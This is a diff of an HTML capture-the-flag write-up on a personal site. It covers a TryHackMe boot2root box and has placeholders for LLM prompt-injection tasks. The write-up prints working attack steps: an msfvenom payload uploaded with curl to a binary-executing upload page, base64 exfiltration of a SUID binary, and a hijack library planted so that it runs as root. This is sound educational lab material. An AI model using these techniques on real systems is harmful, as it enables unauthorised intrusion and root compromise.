                         <span class="cat cat-b2r">Boot2Root</span>
                         <h3>Malscan</h3>
-                    </div>
-                    <span class="box-ip">Target: MalScan Labs sandbox (Apache on :80, SSH on :22) &middot; two flags: user, root</span>
+                    </summary>
+                    <div class="task-body">
+                    <span class="box-ip">Target: MalScan Labs sandbox. Apache on :80, SSH on :22. Two flags: user, root.</span>
 
                     <h4>Recon</h4>
-                    <p>Only 22 and 80 open. <code>/</code> is a static "Site Under Construction" page. A directory probe finds <code>/dev/</code> (301 redirect), a working MalScan Labs frontend with <code>upload.php</code>, <code>about.php</code>, <code>contact.php</code> and a readable <code>assets/</code> listing.</p>
+                    <p>Just 22 and 80 open. The root was a static "Site Under Construction" page. A directory probe found <code>/dev/</code> behind a 301. That path hosted a working MalScan Labs frontend with <code>upload.php</code>, <code>about.php</code>, <code>contact.php</code>, plus a readable <code>assets/</code> listing.</p>
 
-                    <h4>Initial RCE &mdash; the sandbox is not a sandbox</h4>
-                    <p><code>/dev/upload.php</code> accepts a multipart POST, performs an ELF magic-byte check (text files are rejected with <em>"Error: File is not a binary."</em>), runs the uploaded file as www-data, and renders its stdout under <em>"Execution Output:"</em>. A YARA scan runs ahead of execution but doesn't block a plain shellcode payload.</p>
-                    <p>msfvenom gives you a tight ELF whose only job is to run a shell command and let its stdout surface in the response:</p>
+                    <h4>Initial RCE: the "sandbox" that executes stdin</h4>
+                    <p><code>/dev/upload.php</code> takes a multipart POST, checks ELF magic bytes (text files are rejected with "Error: File is not a binary."), runs the uploaded file as www-data, and renders its stdout under "Execution Output:". A YARA scan runs ahead of execution but doesn't block a plain shellcode payload.</p>
+                    <p>I built the ELF with msfvenom, letting its stdout surface in the response:</p>
                     <pre><code>msfvenom -p linux/x64/exec \
     CMD='id; uname -a; find / -name user.txt 2&gt;/dev/null; ls -la /home' \
     -f elf -o /tmp/mal
 
 curl -X POST http://TARGET/dev/upload.php -F "file=@/tmp/mal"</code></pre>
-                    <p>Key leaks from the first probe:</p>
+                    <p>What the first probe gave me:</p>
                     <ul>
                         <li><code>uid=33(www-data)</code>, hostname <code>tryhackme-2404</code> (Ubuntu 24.04).</li>
-                        <li>Two home directories: <code>/home/agent</code> and <code>/home/ubuntu</code>, both unreadable to www-data.</li>
-                        <li>The user flag isn't under <code>/home/*</code> &mdash; it's at <strong><code>/opt/user.txt</code></strong> (world-readable).</li>
+                        <li>Two home directories (<code>/home/agent</code>, <code>/home/ubuntu</code>), both unreadable to www-data.</li>
+                        <li>The user flag isn't under <code>/home/*</code>. It sits at <strong><code>/opt/user.txt</code></strong>, world-readable.</li>
                     </ul>
 
-                    <h4>SUID binary analysis &mdash; /opt/agent/scanner</h4>
-                    <p><code>find / -perm -4000</code> surfaces an unusual SUID binary: <code>/opt/agent/scanner</code> (root, mode 4755), sitting inside <code>/opt/agent</code> which is world-writable (<code>drwxrwxrwx</code>). Exfil it (via a base64 CMD payload), run <code>objdump -d</code>, and the control flow is textbook library-hijack bait:</p>
-                    <pre><code>// Pseudocode of main()
+                    <h4>SUID binary: /opt/agent/scanner</h4>
+                    <p><code>find / -perm -4000</code> surfaced <code>/opt/agent/scanner</code>: SUID root, 16448 bytes, PIE ELF, not stripped. The directory it lived in was world-writable (<code>drwxrwxrwx</code>), which is already a strong smell. I exfiltrated the binary via a base64 CMD payload and ran <code>objdump -d</code>. The control flow was textbook library-hijack bait:</p>
+                    <pre><code>// pseudocode of main()
 char buf[0x200];
 readlink("/proc/self/exe", buf, 0x1ff);          // "/opt/agent/scanner"
 
@@ -649,10 +708,10 @@ snprintf(path, 0x200, "%s/libscan.so", dirname(buf));
 void *h = dlopen(path, RTLD_NOW);
 void (*fn)(void) = dlsym(h, "run");
 fn();</code></pre>
-                    <p>No <code>libscan.so</code> ships in <code>/opt/agent/</code> &mdash; a plain run of the scanner prints <code>dlopen error: ... No such file or directory</code>. Combine that with world-writable <code>/opt/agent/</code> and the SUID bit: whoever drops <code>/opt/agent/libscan.so</code> gets code execution as root the next time the scanner runs.</p>
+                    <p>No <code>libscan.so</code> ships in <code>/opt/agent/</code>. A plain run prints <code>dlopen error: ... No such file or directory</code>. Combine that with a world-writable directory and the SUID bit: drop <code>/opt/agent/libscan.so</code> and the next run of <code>scanner</code> executes my code as root.</p>
 
                     <h4>Building the payload library on target</h4>
-                    <p>The library is trivial. A constructor is enough; <code>RTLD_NOW</code> fires it inside <code>dlopen</code>, well before <code>dlsym("run")</code> would even return:</p>
+                    <p>The library itself is trivial. A constructor is enough: <code>RTLD_NOW</code> fires it inside <code>dlopen</code>, well before <code>dlsym("run")</code> would even return.</p>
                     <pre><code>// /tmp/libscan.c
 #include &lt;stdlib.h&gt;
 #include &lt;unistd.h&gt;
@@ -668,7 +727,7 @@ void run(void) {
 __attribute__((constructor))
 void ctor(void) { run(); }</code></pre>
 
-                    <p>The compile gotcha. The box ships <code>gcc-13</code> and all the tools in <code>/usr/libexec/gcc/x86_64-linux-gnu/13/</code>, but the Apache child environment that executes your uploaded ELF has an <em>empty PATH</em>. The gcc wrapper's <code>execvp("cc1", ...)</code> fails with <code>No such file or directory</code> because <code>cc1</code> isn't in the (empty) PATH and the default search paths don't include <code>/usr/libexec</code>. Fix by passing both <code>-B</code> dirs explicitly and exporting a sane PATH for the linker's own child processes:</p>
+                    <p>The compile gotcha. The box ships <code>gcc-13</code> and all the usual tools in <code>/usr/libexec/gcc/x86_64-linux-gnu/13/</code>, but the Apache child environment that runs my uploaded ELF has an <em>empty PATH</em>. The gcc wrapper's <code>execvp("cc1", ...)</code> fails with "No such file or directory" even though <code>cc1</code> is right there, because the wrapper searches PATH. The fix is to pass both <code>-B</code> dirs explicitly and export a sane PATH for the linker's own child processes.</p>
                     <pre><code>export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 
 gcc -B/usr/libexec/gcc/x86_64-linux-gnu/13/ \
@@ -676,68 +735,83 @@ gcc -B/usr/libexec/gcc/x86_64-linux-gnu/13/ \
     -shared -fPIC \
     -o /tmp/libscan.so /tmp/libscan.c</code></pre>
 
-                    <p>Then plant and trigger:</p>
+                    <p>Plant and trigger:</p>
                     <pre><code>cp /tmp/libscan.so /opt/agent/libscan.so
 chmod 755 /opt/agent/libscan.so
-/opt/agent/scanner        # SUID root loads our .so, constructor runs as root
+/opt/agent/scanner        # SUID loads the .so, constructor runs as root
 cat /tmp/root_pwn
 # =&gt; uid=0(root) gid=0(root) groups=0(root),33(www-data)
 # =&gt; root flag text</code></pre>
 
-                    <p>All of that bundles into a single msfvenom <code>CMD=</code> payload if you want it as one upload.</p>
+                    <p>I bundled all of that into a single msfvenom <code>CMD=</code> payload so one upload did everything.</p>
 
-                    <div class="takeaway"><strong>Takeaway.</strong> A "sandbox" that advertises <em>"passed YARA and was emulated"</em> while actually executing the binary and streaming its stdout back is a free <code>system()</code> as the server user. And an SUID binary that <code>dlopen</code>s a sibling path in a world-writable directory doesn't even need to be overwritten &mdash; the missing library is the hijack.</div>
+                    <h4>What I'll remember</h4>
+                    <ul>
+                        <li>A "sandbox" that advertises "passed YARA and was emulated" while actually executing the binary and streaming its stdout back is a free <code>system()</code> as the server user.</li>
+                        <li>A SUID binary that <code>dlopen</code>s a sibling path from a world-writable directory doesn't need the library to be overwritten. The <em>missing</em> library is the hijack.</li>
+                        <li>Apache's child environment runs with an empty PATH. That's not AppArmor, that's just environment. <code>-B</code> + explicit <code>PATH</code> is the fix.</li>
+                    </ul>
 
-                    <p><strong>Flag formats:</strong> user <code>THM{almost_d0n3-keep_it_g01ng}</code>, root <code>THM{y0u_d1d_th1s_congrats}</code> &mdash; actual values <span class="redacted">redacted per TryHackMe policy</span>.</p>
-                </article>
+                    <p><strong>Flag formats:</strong> user <code>THM{almost_d0n3-keep_it_g01ng}</code>, root <code>THM{y0u_d1d_th1s_congrats}</code>.</p>
+
+                    </div>
+                </details>
 
                 <!-- ============= TASK 8 ============= -->
-                <article class="task" id="task-8">
-                    <div class="task-head">
+                <details class="task" id="task-8">
+                    <summary>
                         <span class="task-num">Task 08</span>
                         <span class="cat cat-llm">LLM</span>
                         <h3>HelloGPT</h3>
+                    </summary>
+                    <div class="task-body">
+                        <!-- TODO fill from own notes. Prompt injection / system-prompt leak? -->
+                        <div class="pending-note">Writeup pending. Adding the prompt the model was told to protect, the injection that leaked it, and whether the solve hinged on role-play framing, context-stuffing or a tool-call escape.</div>
                     </div>
-                    <!-- TODO Pushpender: fill from your own notes. Prompt-injection / system-prompt leak? -->
-                    <div class="pending-note">Writeup pending. Add the prompt the model protected, the injection payload that leaked it, and whether the solve hinged on role-play framing, context-stuffing, or a tool-call escape.</div>
-                </article>
+                </details>
 
                 <!-- ============= TASK 9 ============= -->
-                <article class="task" id="task-9">
-                    <div class="task-head">
+                <details class="task" id="task-9">
+                    <summary>
                         <span class="task-num">Task 09</span>
                         <span class="cat cat-llm">LLM</span>
                         <h3>BankGPT</h3>
+                    </summary>
+                    <div class="task-body">
+                        <!-- TODO fill from own notes. -->
+                        <div class="pending-note">Writeup pending. Adding the model's authorised actions, the privilege the attack had to cross, and the exact chat turns that produced the flag.</div>
                     </div>
-                    <!-- TODO Pushpender: fill from your own notes. -->
-                    <div class="pending-note">Writeup pending. Add the model's authorised actions, the privilege the attack had to cross (likely account/role-scope), and the exact chat turns that produced the flag.</div>
-                </article>
+                </details>
 
                 <!-- ============= TASK 10 ============= -->
-                <article class="task" id="task-10">
-                    <div class="task-head">
+                <details class="task" id="task-10">
+                    <summary>
                         <span class="task-num">Task 10</span>
                         <span class="cat cat-code">Coding</span>
                         <h3>Math Wiz</h3>
+                    </summary>
+                    <div class="task-body">
+                        <!-- TODO fill from own notes. Region = Europe (Ireland) required. -->
+                        <div class="pending-note">Writeup pending. Adding the task input shape, the algorithm or edge case that mattered, and my final script.</div>
                     </div>
-                    <!-- TODO Pushpender: fill from your own notes. Region = Europe (Ireland) required. -->
-                    <div class="pending-note">Writeup pending. Add the task input shape, the algorithm/edge case that mattered, and the final solution script.</div>
-                </article>
+                </details>
 
                 <!-- ============= TASK 11 ============= -->
-                <article class="task" id="task-11">
-                    <div class="task-head">
+                <details class="task" id="task-11">
+                    <summary>
                         <span class="task-num">Task 11</span>
                         <span class="cat cat-code">Coding</span>
                         <h3>Exposed</h3>
+                    </summary>
+                    <div class="task-body">
+                        <!-- TODO fill from own notes. Region = Europe (Ireland) required. -->
+                        <div class="pending-note">Writeup pending. Adding the exposed data source, the parsing that extracted the flag, and my solution script.</div>
                     </div>
-                    <!-- TODO Pushpender: fill from your own notes. Region = Europe (Ireland) required. -->
-                    <div class="pending-note">Writeup pending. Add the exposed data-source, the parsing that extracted the flag, and your solution script.</div>
-                </article>
+                </details>
 
                 <div class="footer-note">
-                    <p>Room link: <a href="https://tryhackme.com/room/dehlimeetup" target="_blank" rel="noopener noreferrer">tryhackme.com/room/dehlimeetup</a>. Hosted at the TryHackMe x EHAX workshop at Delhi Technological University on 2026-10-13.</p>
-                    <p>Flags are deliberately redacted per <a href="https://tryhackme.com/" target="_blank" rel="noopener noreferrer">TryHackMe</a>'s writeup rules. If you need the actual flag strings to validate your own solve, run the room yourself; the techniques here reproduce them.</p>
+                    <p>Room: <a href="https://tryhackme.com/room/dehlimeetup" target="_blank" rel="noopener noreferrer">tryhackme.com/room/dehlimeetup</a>. Hosted at the TryHackMe x EHAX workshop in BR Ambedkar Auditorium, DTU, on 2026-10-13.</p>
+                    <p>Flag strings are kept out of this page because TryHackMe's writeup rules say so. If you want the real values to validate your own solve, run the room yourself. The techniques above reproduce them.</p>
                 </div>
 
             </div>
@@ -746,7 +820,7 @@ cat /tmp/root_pwn
 
     <footer style="padding: 2rem 0 2.5rem; border-top: 1px solid var(--glass-border); margin-top: 2rem;">
         <div class="container" style="text-align: center; color: var(--text-muted); font-size: 0.9rem;">
-            <p>&copy; 2026 Pushpender Singh Rathore &middot; <a href="../index.html" style="color: var(--accent-secondary);">pushpenderrathore.github.io</a></p>
+            <p>&copy; 2026 Pushpender Singh Rathore · <a href="../index.html" style="color: var(--accent-secondary);">pushpenderrathore.github.io</a></p>
         </div>
     </footer>
 </body>
